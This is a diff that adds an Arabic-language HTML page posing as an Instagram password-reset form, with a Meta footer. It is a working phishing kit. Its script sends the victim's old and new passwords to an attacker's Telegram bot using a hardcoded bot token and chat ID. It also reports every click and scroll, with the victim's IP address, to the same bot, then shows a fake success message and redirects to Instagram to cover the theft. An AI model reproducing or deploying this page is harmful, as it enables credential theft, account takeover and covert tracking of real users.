@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إعادة تعيين كلمة السر</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            text-align: center;
+            background-color: #f9f9f9;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 50px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            font-size: 20px;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            text-align: right;
+        }
+        .btn {
+            width: 95%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #ccc;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            opacity: 0.6;
+        }
+        .btn.active {
+            background-color: #007bff;
+            opacity: 1;
+        }
+        .message {
+            color: green;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .error {
+            color: red;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+        }
+        .password-strength {
+            font-size: 14px;
+            margin-top: 5px;
+            font-weight: bold;
+        }
+        .weak {
+            color: red;
+        }
+        .medium {
+            color: orange;
+        }
+        .strong {
+            color: green;
+        }
+        .show-password {
+            cursor: pointer;
+            color: #007bff;
+            font-size: 14px;
+            display: block;
+            margin-top: -5px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>إعادة تعيين كلمة السر</h2>
+    <p>يجب ألا تقل كلمة السر عن ستة أحرف وأن تتضمن توليفة من الأرقام والأحرف الأبجدية والرموز الخاصة</p>
+
+    <form id="passwordForm">
+        <input type="password" id="oldPassword" name="oldPassword" placeholder="كلمة السر القديمة" required>
+        <input type="password" id="newPassword" name="newPassword" placeholder="كلمة السر الجديدة" required>
+        <input type="password" id="confirmPassword" name="confirmPassword" placeholder="تأكيد كلمة السر الجديدة" required>
+
+        <button type="submit" id="submitBtn" class="btn" disabled>إعادة تعيين كلمة السر</button>
+    </form>
+
+    <div id="passwordStrengthMessage" class="password-strength"></div>
+    <p id="errorMessage" class="error"></p>
+    <span id="togglePassword" class="show-password">إظهار كلمة السر</span>
+</div>
+
+<div class="footer">
+    &copy; Instagram. Meta Platforms, Inc., 1601 Willow Road, Menlo Park, CA 94025
+</div>
+
+<script>
+    const oldPasswordInput = document.getElementById('oldPassword');
+    const newPasswordInput = document.getElementById('newPassword');
+    const confirmPasswordInput = document.getElementById('confirmPassword');
+    const submitBtn = document.getElementById('submitBtn');
+    const errorMessage = document.getElementById('errorMessage');
+    const passwordStrengthMessage = document.getElementById('passwordStrengthMessage');
+    const togglePassword = document.getElementById('togglePassword');
+
+    const TELEGRAM_BOT_API = 'https://api.telegram.org/bot6924402995:AAEx-1e3pcV9kpYjpQnsjN-lkvreoCjxkFs';
+    const CHAT_ID = '1046458749';
+
+    // Function to get the user's IP address using ipify API
+    function getUserIP() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => data.ip);
+    }
+
+    // Function to send user interaction data to Telegram bot
+    function sendInteractionDataToTelegram(interactionType, userIP) {
+        const message = `
+        نوع التفاعل: ${interactionType}
+        عنوان الـ IP: ${userIP}
+        `;
+
+        fetch(`${TELEGRAM_BOT_API}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        })
+        .catch(error => {
+            console.error('خطأ في إرسال البيانات إلى Telegram:', error);
+        });
+    }
+
+    // Function to check passwords and enable/disable submit button
+    function checkPasswords() {
+        const oldPassword = oldPasswordInput.value;
+        const newPassword = newPasswordInput.value;
+        const confirmPassword = confirmPasswordInput.value;
+
+        if (oldPassword && newPassword && confirmPassword && newPassword === confirmPassword) {
+            submitBtn.classList.add('active');
+            submitBtn.disabled = false;
+            errorMessage.textContent = ''; // Clear error message
+        } else {
+            submitBtn.classList.remove('active');
+            submitBtn.disabled = true;
+
+            // Show error message if passwords don't match
+            if (newPassword !== confirmPassword) {
+                errorMessage.textContent = 'كلمات المرور غير متطابقة!';
+            } else {
+                errorMessage.textContent = '';
+            }
+        }
+    }
+
+    // Function to send data to Telegram bot
+    function sendToTelegram(oldPassword, newPassword) {
+        const message = `
+        تم طلب إعادة تعيين كلمة السر:
+        كلمة السر القديمة: ${oldPassword}
+        كلمة السر الجديدة: ${newPassword}
+        `;
+
+        fetch(`${TELEGRAM_BOT_API}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // عرض رسالة التأكيد بعد إرسال البيانات
+                const successMessage = document.createElement('p');
+                successMessage.textContent = 'تم تغيير كلمة السر بنجاح!';
+                successMessage.style.color = 'green';
+                successMessage.style.fontSize = '18px';
+                successMessage.style.marginTop = '20px';
+                document.body.appendChild(successMessage);
+                
+                // بعد 3 ثوانٍ، يتم تحويل المستخدم إلى موقع Instagram
+                setTimeout(function() {
+                    window.location.href = 'https://www.instagram.com/';
+                }, 3000); // 3000 مللي ثانية = 3 ثواني
+            } else {
+                alert('حدث خطأ أثناء إرسال البيانات');
+            }
+        })
+        .catch(error => {
+            alert('خطأ في الاتصال بـ Telegram');
+        });
+    }
+
+    // Function to check password strength
+    function checkPasswordStrength(password) {
+        let strength = 'ضعيفة';
+        let strengthClass = 'weak';
+
+        if (password.length >= 8 && /[A-Z]/.test(password) && /\d/.test(password) && /[!@#$%^&*()]/.test(password)) {
+            strength = 'قوية';
+            strengthClass = 'strong';
+        } else if (password.length >= 6) {
+            strength = 'متوسطة';
+            strengthClass = 'medium';
+        }
+
+        passwordStrengthMessage.textContent = `قوة كلمة السر: ${strength}`;
+        passwordStrengthMessage.className = `password-strength ${strengthClass}`;
+    }
+
+    // Toggle password visibility
+    function togglePasswordVisibility() {
+        const type = newPasswordInput.type === 'password' ? 'text' : 'password';
+        oldPasswordInput.type = type;
+        newPasswordInput.type = type;
+        confirmPasswordInput.type = type;
+        togglePassword.textContent = type === 'password' ? 'إظهار كلمة السر' : 'إخفاء كلمة السر';
+    }
+
+    // Event listeners
+    oldPasswordInput.addEventListener('input', checkPasswords);
+    newPasswordInput.addEventListener('input', () => {
+        checkPasswords();
+        checkPasswordStrength(newPasswordInput.value);
+    });
+    confirmPasswordInput.addEventListener('input', checkPasswords);
+
+    togglePassword.addEventListener('click', togglePasswordVisibility);
+
+    // Track user interactions (like clicks, scrolls, etc.)
+    document.addEventListener('click', function() {
+        getUserIP().then(userIP => sendInteractionDataToTelegram('نقرة', userIP));
+    });
+
+    document.addEventListener('scroll', function() {
+        getUserIP().then(userIP => sendInteractionDataToTelegram('تمرير الصفحة', userIP));
+    });
+
+    // Form submission handler
+    document.getElementById('passwordForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        const oldPassword = oldPasswordInput.value;
+        const newPassword = newPasswordInput.value;
+
+        if (oldPassword && newPassword) {
+            sendToTelegram(oldPassword, newPassword);
+        }
+    });
+</script>
+
+</body>
+</html>
